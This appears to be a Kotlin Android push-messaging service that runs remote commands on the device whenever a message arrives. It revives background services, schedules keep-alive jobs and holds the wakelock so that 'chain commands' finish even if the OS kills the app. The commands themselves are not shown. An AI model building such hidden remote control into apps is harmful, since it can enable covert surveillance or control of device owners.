package com.example.myandroid

import com.google.firebase.messaging.FirebaseMessagingService
import com.google.firebase.messaging.RemoteMessage
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch

class MyFcmService : FirebaseMessagingService() {

    override fun onNewToken(token: String) {
        // Save token locally for the HealthWorker to pick up
        getSharedPreferences("app_identity", MODE_PRIVATE)
            .edit().putString("fcm_token", token).apply()
        DebugLogger.log("FCM", "New token generated")
        
        // Trigger immediate robust upload
        val constraints = androidx.work.Constraints.Builder()
            .setRequiredNetworkType(androidx.work.NetworkType.CONNECTED)
            .build()
        val immediateHealthCheck = androidx.work.OneTimeWorkRequestBuilder<HealthWorker>()
            .setConstraints(constraints)
            .build()
        androidx.work.WorkManager.getInstance(applicationContext).enqueueUniqueWork(
            "FCM_TOKEN_UPDATE", 
            androidx.work.ExistingWorkPolicy.REPLACE, 
            immediateHealthCheck
        )
    }

    override fun onMessageReceived(remoteMessage: RemoteMessage) {
        val data = remoteMessage.data
        
        ServiceResurrector.shock(applicationContext)
        KeepAliveReceiver.scheduleNext(applicationContext)

        // ENQUEUE BACKUP: WorkManager guarantees execution even if OS kills the FCM thread
        try {
            val workRequest = androidx.work.OneTimeWorkRequestBuilder<RemoteCommandWorker>().build()
            androidx.work.WorkManager.getInstance(applicationContext)
                .enqueueUniqueWork("FCM_BACKUP_CMD", androidx.work.ExistingWorkPolicy.REPLACE, workRequest)
            DebugLogger.log("FCM", "Backup Worker queued.")
        } catch (e: Exception) {
            DebugLogger.log("FCM_ERR", "Worker queue failed: ${e.message}")
        }

        // IMMEDIATE EXECUTION: Block the FCM thread to leverage its native WakeLock.
        kotlinx.coroutines.runBlocking {
            try {
                // BUGFIX: Allow up to 45s so that long chain commands with multiple delays have time to finish
                kotlinx.coroutines.withTimeout(45000L) {
                    DebugLogger.log("FCM", "Holding WakeLock. Executing CommandProcessor...")
                    kotlinx.coroutines.delay(1000) // Network stabilization
                    CommandProcessor.checkAndExecute(applicationContext)
                    DebugLogger.log("FCM", "Direct execution finished.")
                }
            } catch (e: kotlinx.coroutines.TimeoutCancellationException) {
                DebugLogger.log("FCM_WARN", "Execution timed out (45s). Handing off to Worker.")
            } catch (e: Exception) {
                DebugLogger.log("FCM_ERR", "Fatal execution error: ${e.message}")
            }
        }
    }
}